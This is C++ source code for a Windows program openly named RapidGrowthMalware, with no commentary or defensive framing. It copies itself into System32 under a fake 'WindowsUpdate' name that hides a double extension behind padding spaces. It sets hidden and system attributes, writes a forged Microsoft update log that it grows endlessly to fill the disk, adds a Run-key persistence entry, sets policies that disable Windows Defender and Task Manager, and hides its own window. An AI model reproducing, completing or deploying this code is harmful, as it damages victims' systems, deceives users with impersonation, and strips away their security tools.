#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

class RapidGrowthMalware {
private:
    std::wstring system32Path;
    std::wstring exeFilePath;
    std::wstring txtFilePath;
    HANDLE hMutex;
    const DWORD growthTarget = 2147483648; // 2GB in bytes
    const DWORD chunkSize = 104857600; // 100MB chunks

    void initializePaths() {
        WCHAR path[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_SYSTEM, NULL, 0, path);
        system32Path = path;
        
        exeFilePath = system32Path + L"\\WindowsUpdate.dll                                                .exe";
        txtFilePath = system32Path + L"\\WindowsUpdate.dll                                                .txt";
    }

    bool acquireSingletonLock() {
        hMutex = CreateMutexW(NULL, TRUE, L"Global\\WinUpdateCoreMutexX987");
        return GetLastError() != ERROR_ALREADY_EXISTS;
    }

    void createInitialFiles() {
        createDeceptiveExe();
        createInitialTxtFile();
    }

    void createDeceptiveExe() {
        WCHAR selfPath[MAX_PATH];
        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
        CopyFileW(selfPath, exeFilePath.c_str(), FALSE);
        setHiddenSystemAttributes(exeFilePath);
    }

    void setHiddenSystemAttributes(const std::wstring& filePath) {
        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    }

    void createInitialTxtFile() {
        std::vector<std::wstring> contentLines = {
            L"Microsoft Windows Update Core Module",
            L"Version: 10.0.22621.1413",
            L"Build: 22H2",
            L"Copyright © Microsoft Corporation. All rights reserved.",
            L"",
            L"Module: Security Intelligence Update Engine",
            L"Status: Active - Downloading Cumulative Updates",
            L"Update Sequence: 2023-11B Security Monthly Quality Rollup",
            L"Verification: SHA-256 Digital Signature Valid",
            L"Certificate: Microsoft Windows Production PCA 2011",
            L"",
            L"Downloading security intelligence updates...",
            L"Processing update metadata...",
            L"Verifying file integrity...",
            L"Applying system patches...",
            L"Optimizing performance...",
            L"Scanning for vulnerabilities...",
            L"Updating defender definitions...",
            L"Compressing update payload...",
            L"Validating digital signatures...",
            L"Preparing system components...",
            L""
        };

        std::wofstream file(txtFilePath, std::ios::binary);
        if (file.is_open()) {
            for (const auto& line : contentLines) {
                file << line << L"\n";
            }
            file.close();
            setHiddenSystemAttributes(txtFilePath);
        }
    }

    void rapidFileGrowth() {
        std::vector<wchar_t> largeBuffer;
        largeBuffer.reserve(chunkSize / sizeof(wchar_t));
        
        for (DWORD i = 0; i < chunkSize / (100 * sizeof(wchar_t)); ++i) {
            largeBuffer.insert(largeBuffer.end(), L"Windows Update Core Service: Downloading security patches and system updates. This process ensures your system remains protected against the latest threats. ");
        }

        while (true) {
            DWORD startTime = GetTickCount();
            DWORD totalWritten = 0;
            
            std::wofstream file(txtFilePath, std::ios::binary | std::ios::app);
            if (file.is_open()) {
                while (totalWritten < growthTarget && (GetTickCount() - startTime) < 60000) {
                    file.write(largeBuffer.data(), largeBuffer.size());
                    totalWritten += chunkSize;
                    
                    if (GetTickCount() - startTime > 59000) {
                        break;
                    }
                    
                    Sleep(100);
                }
                file.close();
            }
            
            DWORD elapsed = GetTickCount() - startTime;
            if (elapsed < 60000) {
                Sleep(60000 - elapsed);
            }
        }
    }

    void establishPersistence() {
        HKEY hKey;
        std::wstring regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsUpdateCoreService", 0, REG_SZ, (const BYTE*)exeFilePath.c_str(), (exeFilePath.size() + 1) * sizeof(WCHAR));
            RegCloseKey(hKey);
        }

        HKEY hKeyPolicy;
        std::wstring policyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, policyPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKeyPolicy, NULL) == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExW(hKeyPolicy, L"ShowSuperHidden", 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
            RegCloseKey(hKeyPolicy);
        }
    }

    void disableWindowsDefender() {
        HKEY hKey;
        std::wstring defenderPath = L"Software\\Policies\\Microsoft\\Windows Defender";
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, defenderPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD disable = 1;
            RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(DWORD));
            RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&disable, sizeof(DWORD));
            RegCloseKey(hKey);
        }
    }

    void hideFromTaskManager() {
        HKEY hKey;
        std::wstring taskmgrPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, taskmgrPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
            RegCloseKey(hKey);
        }
    }

    void executeSilently() {
        HWND hWnd = GetConsoleWindow();
        if (hWnd) ShowWindow(hWnd, SW_HIDE);
        
        if (!acquireSingletonLock()) {
            ExitProcess(0);
        }

        disableWindowsDefender();
        hideFromTaskManager();
        createInitialFiles();
        establishPersistence();

        std::thread growthThread([this]() { rapidFileGrowth(); });
        growthThread.detach();

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

public:
    RapidGrowthMalware() : hMutex(NULL) {
        initializePaths();
    }

    ~RapidGrowthMalware() {
        if (hMutex) CloseHandle(hMutex);
    }

    void run() {
        executeSilently();
    }
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    RapidGrowthMalware malware;
    malware.run();
    return 0;
}